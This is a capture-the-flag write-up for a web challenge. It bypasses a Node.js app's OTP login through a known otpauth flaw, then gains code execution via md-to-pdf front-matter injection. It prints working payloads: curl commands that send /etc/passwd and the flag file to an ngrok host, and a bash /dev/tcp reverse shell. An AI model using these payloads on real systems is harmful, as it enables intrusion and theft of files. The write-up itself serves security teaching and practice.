---
title: "Web: PDF Generator"
date: "2024-06-27"
tags:
    - vulnerable packages
thumbnail: "/assets/img/thumbnail/icmtc24.png"
---

# Description
---
There's a problem with rendering the generated pdf, You need to execute /flag to be able to investigate in that issue.


# Solution
---
when we start we see a page with `Cannot GET /`, so i tried to go to `/robots.txt` and i found
```
User-agent: *
Disallow: /src.zip
```
`/src.zip` contains the source code, now we can begin.

`routes.js` file contains
```js
const express = require('express');
const { encrypt, decrypt, mdToPdfAsync, rateLimit, requireSession } = require('./utils');
const OTPAuth = require('otpauth');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

const router = express.Router();
const secret = new OTPAuth.Secret();
const totp = new OTPAuth.TOTP({
    secret: secret,
    label: 'MarkdownToPDF',
    algorithm: 'SHA1',
    digits: 6,
    period: 30
});
const sessions = {};
const requestCounts = {};
const key = crypto.randomBytes(32);
const iv = crypto.randomBytes(16);

// Serve the OTP input form
router.get('/otp', (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'otp.html'));
});

// Validate the OTP and set session cookie
router.post('/validate-otp', rateLimit(requestCounts), (req, res) => {
    try {
        const userOTP = req.body.otp;
        const userIP = req.ip;

        if (totp.validate({ token: userOTP, window: 1 })) {
            const randomValue = crypto.randomBytes(16).toString('hex');
            const sessionToken = encrypt(`${userIP}:${randomValue}:${userOTP}`, key, iv);
            const expiry = Date.now() + 5 * 60 * 1000; // 5 minutes from now
            sessions[sessionToken] = { expiry };
            res.cookie('session', sessionToken, { httpOnly: true });
            res.redirect('/convert');
        } else {
            res.redirect('/otp?invalid=true');
        }
    } catch (error) {
        console.error('Error validating OTP:', error);
        res.status(500).send('Server error.');
    }
});

// Serve the markdown input form
router.get('/convert', requireSession(sessions), (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'convert.html'));
});

// Handle form submission and convert markdown to PDF
router.post('/convert', requireSession(sessions), rateLimit(requestCounts), async (req, res) => {
    try {
        const markdownContent = req.body.markdown;

        if (!markdownContent || typeof markdownContent !== 'string' || markdownContent.trim() === '') {
            return res.status(400).send('Invalid markdown content.');
        }

        const outputFilePath = path.join(__dirname, 'output.pdf');
        const pdf = await mdToPdfAsync({ content: markdownContent });

        if (pdf && pdf.content) {
            fs.writeFileSync(outputFilePath, pdf.content);

            res.download(outputFilePath, 'converted.pdf', (err) => {
                if (err) {
                    console.error('Error downloading the file:', err);
                }

                // Clean up the file after download
                fs.unlinkSync(outputFilePath);
            });
        } else {
            throw new Error('Failed to generate PDF.');
        }
    } catch (error) {
        console.error('Error converting markdown to PDF:', error);
        res.status(500).send('Server error.');
    }
});

// Serve robots.txt
router.get('/robots.txt', (req, res) => {
    res.type('text/plain');
    res.sendFile(path.join(__dirname, 'public', 'robots.txt'));
});

// Serve src.zip
router.get('/src.zip', (req, res) => {
    const file = path.join(__dirname, 'public', 'src.zip');
    res.download(file);
});

module.exports = router;
```
After examining this code you will find that you can visit `/otp` but you can't visit `/convert` as it needs an established session and this session is created after submitting the right OTP.

There's also `/utils.js` contains
```js
const crypto = require('crypto');
const { mdToPdf } = require('md-to-pdf');

const encrypt = (text, key, iv) => {
    const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);
    let encrypted = cipher.update(text, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    return encrypted;
};

const decrypt = (encrypted, key, iv) => {
    const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
    let decrypted = decipher.update(encrypted, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    return decrypted;
};

const mdToPdfAsync = async (markdown) => {
    return await mdToPdf({ content: markdown }).catch(console.error);
};

const rateLimit = (requestCounts) => (req, res, next) => {
    try {
        const ip = req.ip;

        if (!requestCounts[ip]) {
            requestCounts[ip] = {
                count: 0,
                resetTime: Date.now() + 100000
            };
        }

        const currentRequestCount = requestCounts[ip].count;
        const resetTime = requestCounts[ip].resetTime;

        if (Date.now() > resetTime) {
            requestCounts[ip].count = 0;
            requestCounts[ip].resetTime = Date.now() + 100000;
        }

        requestCounts[ip].count++;

        if (currentRequestCount >= 50) {
            requestCounts[ip].resetTime = Date.now() + 300000;
            console.log(`Rate limit exceeded for IP ${ip}. Access blocked for 300 seconds.`);
            res.sendFile(path.join(__dirname, 'views', 'rate_limit.html'), {
                timeRemaining: Math.ceil((resetTime - Date.now()) / 1000)
            });
        } else {
            next();
        }
    } catch (error) {
        console.error('Error in rate limit middleware:', error);
        res.status(500).send('Server error.');
    }
};

const requireSession = (sessions) => (req, res, next) => {
    try {
        const sessionToken = req.cookies.session;

        if (sessionToken) {
            const session = sessions[sessionToken];

            if (session && session.expiry > Date.now()) {
                return next();
            } else {
                delete sessions[sessionToken];
            }
        }
        res.redirect('/otp');
    } catch (error) {
        console.error('Error in session middleware:', error);
        res.status(500).send('Server error.');
    }
};

module.exports = { encrypt, decrypt, mdToPdfAsync, rateLimit, requireSession };

```

Anyway let's visit `/otp` endpoint which is very simple
<img src="/assets/img/icmtc24/capture2.png">

After many attempts and reading the source code i noticed that `const OTPAuth = require('otpauth');` and searched about this package and i found that the package itself is vulnerable.
You can that see <a href="https://security.snyk.io/vuln/SNYK-JS-OTPAUTH-451697">here</a>.
The `totp.validate()` function which is used in our code is vulnerable and may return positive values for single digit tokens even if they are invalid. This may allow attackers to bypass the OTP authentication by providing single digit tokens.

Very nice after this info i tried to submit a single digit from 0 to 9 and one of them logged me in successfully.

After logging in i got redirected to `/convert`
<img src="/assets/img/icmtc24/capture3.png">

So this page takes and md input and makes it PDF.
When I try to supply any input, i get **server error** but the function works properly underground (the error is in rendering only), so It's a blind challange then ummmmmmmmmmmm.

After attempts i noticed also that the sorc code has `const { mdToPdf } = require('md-to-pdf');`

Guess What !!!
Yeah very new way !!
This package is also vulnerable xDDD

You can find that <a href="https://security.snyk.io/vuln/SNYK-JS-MDTOPDF-1657880">here</a>
From the article i found that the payload i will use is
```js
---js
((require("child_process")).execSync("id > /tmp/RCE.txt"))
---RCE
```
But the response isn't rendered so we will try another way.
The way i think here is to execute a command that sends any request to an ip i have and if i got the response then the RCE works.

On my local linux machine i started listening on port 4444 (the port at which i will wait for the request), but note that this port is local so the target can reach me.
As a solution i started ngrok using `ngrok tcp 4444` which works as a forwared in this situation.
This command means that the public ip supplied from ngrok will forward the requests it gets to my localhost on port 4444.

I got `IP:0.tcp.eu.ngrok.io port:17552` from ngrok, so any request to `0.tcp.eu.ngrok.io:17552` will be forward to `localhost:4444`.

when i try to use the payload
```js
---js
((require("child_process")).execSync('curl http://0.tcp.eu.ngrok.io:17552'));
---RCE
```

i get
```bash
┌──(youssif㉿youssif)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 59622
GET / HTTP/1.1
Host: e874-156-160-149-56.ngrok-free.app
User-Agent: curl/7.88.1
Accept: */*
X-Forwarded-For: 46.101.193.189
X-Forwarded-Host: e874-156-160-149-56.ngrok-free.app
X-Forwarded-Proto: https
Accept-Encoding: gzip
```

So there's RCE and works well, I tried to get a reverse shell but i couldn't during the ctf, so i tried LFI.

After attempts i used this payload

```js
---js
((require("child_process")).execSync('curl -X POST --data-binary "@/etc/passwd" http://0.tcp.eu.ngrok.io:17552'));
---RCE
```
and i got the content of /etc/passwd
```bash
┌──(youssif㉿youssif)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 35736
POST / HTTP/1.1
Host: 0.tcp.eu.ngrok.io:17552
User-Agent: curl/7.88.1
Accept: */*
Content-Length: 972
Content-Type: application/x-www-form-urlencoded

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
node:x:1000:1000::/home/node:/bin/bash
nodez:x:1001:1001::/home/nodez:/bin/bash
messagebus:x:100:102::/nonexistent:/usr/sbin/nologin
```

I could read `/flag` but with small modification because it was an executable file with exec permissions only 
```js
---js
((require("child_process")).execSync('curl -X POST --data-binary "$(/flag)" http://0.tcp.eu.ngrok.io:17552'));
---RCE
```
I got 
```bash
┌──(youssif㉿youssif)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 36472
POST / HTTP/1.1
Host: 0.tcp.eu.ngrok.io:17552
User-Agent: curl/7.88.1
Accept: */*
Content-Length: 97
Content-Type: application/x-www-form-urlencoded

Congratulations, this is the flag location: /tmp/fc80064fad72eab4561049ae973e20ba/flag_HALDXQ.txt
```

Now i can read the flag using
```js
---js
((require("child_process")).execSync('curl -X POST --data-binary "@/tmp/fc80064fad72eab4561049ae973e20ba/flag_HALDXQ.txt" http://0.tcp.eu.ngrok.io:17552'));
---RCE
```
and congratz you got the flag
```bash
┌──(youssif㉿youssif)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 53184
POST /? HTTP/1.1
Host: 5.tcp.eu.ngrok.io:14819
User-Agent: curl/7.88.1
Accept: */*
Content-Length: 52
Content-Type: application/x-www-form-urlencoded

EGCERT{3e20ba_4lw4y5_ch3ck_f0r_vuln3r4bl3_p4ck4g35}
```

### Beyond flag

The other way which is getting the reverse shell is easier i got it but before the ctf using the command
```js
---js
((require("child_process")).execSync('bash -c "bash -i >& /dev/tcp/0.tcp.eu.ngrok.io/17552 0>&1"'))
---RCE
```
Then on the listening port i got a reverse shell and did that
```bash
┌──(youssif㉿youssif)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 44750
nodez@8372928b8e00:/usr/src/app$ /flag
/flag
Congratulations, this is the flag location: /tmp/dc279a58e03ed93d03b1ed6b4c3c5330/flag_JQRCMB.txt
nodez@8372928b8e00:/usr/src/app$ cat /tmp/dc279a58e03ed93d03b1ed6b4c3c5330/flag_JQRCMB.txt
cat /tmp/dc279a58e03ed93d03b1ed6b4c3c5330/flag_JQRCMB.txt
EGCERT{3c5330_4lw4y5_ch3ck_f0r_vuln3r4bl3_p4ck4g35}
```

I also checked the permissions of `/flag` and the real flag to verify the reason why i couldn't read /flag like the real flag or /etc/passwd and found this
```bash
nodez@8372928b8e00:/usr/src/app$ ls -la /
ls -la /
total 112
drwxr-xr-x   1 root root  4096 Jun 26 07:08 .
drwxr-xr-x   1 root root  4096 Jun 26 07:08 ..
-rwxr-xr-x   1 root root     0 Jun 26 07:08 .dockerenv
lrwxrwxrwx   1 root root     7 Jun 12 00:00 bin -> usr/bin
drwxr-xr-x   2 root root  4096 Jan 28 21:20 boot
drwxr-xr-x   5 root root   360 Jun 26 07:08 dev
drwxr-xr-x   1 root root  4096 Jun 26 07:08 etc
---x--x--x   1 root root 17136 Jun 23 11:51 flag
drwxr-xr-x   1 root root  4096 Jun 22 01:20 home
lrwxrwxrwx   1 root root     7 Jun 12 00:00 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Jun 12 00:00 lib64 -> usr/lib64
drwxr-xr-x   2 root root  4096 Jun 12 00:00 media
drwxr-xr-x   2 root root  4096 Jun 12 00:00 mnt
drwxr-xr-x   1 root root  4096 Jun 21 01:03 opt
dr-xr-xr-x 214 root root     0 Jun 26 07:08 proc
drwx------   1 root root  4096 Jun 23 11:51 root
drwxr-xr-x   1 root root  4096 Jun 13 03:40 run
lrwxrwxrwx   1 root root     8 Jun 12 00:00 sbin -> usr/sbin
drwxr-xr-x   2 root root  4096 Jun 12 00:00 srv
dr-xr-xr-x  13 root root     0 Jun 26 07:08 sys
drwxrwx-wt   1 root root 20480 Jun 27 18:29 tmp
drwxr-xr-x   1 root root  4096 Jun 12 00:00 usr
drwxr-xr-x   1 root root  4096 Jun 12 00:00 var
nodez@8372928b8e00:/tmp$ ls -la /tmp/51eb18c330994e86115669c71e960ecd                
ls -la /tmp/51eb18c330994e86115669c71e960ecd
total 28
drwx------ 2 nodez nodez  4096 Jun 27 18:30 .
drwxrwx-wt 1 root  root  20480 Jun 27 18:30 ..
-rw-r--r-- 1 nodez nodez    52 Jun 27 18:30 flag_QXIZVN.txt
```
the /flag file has only exec permissions unlike the flag text file and /etc/passwd which are readable and don't have exec permissions

I wish the write up was useful
Thanks for reading ^^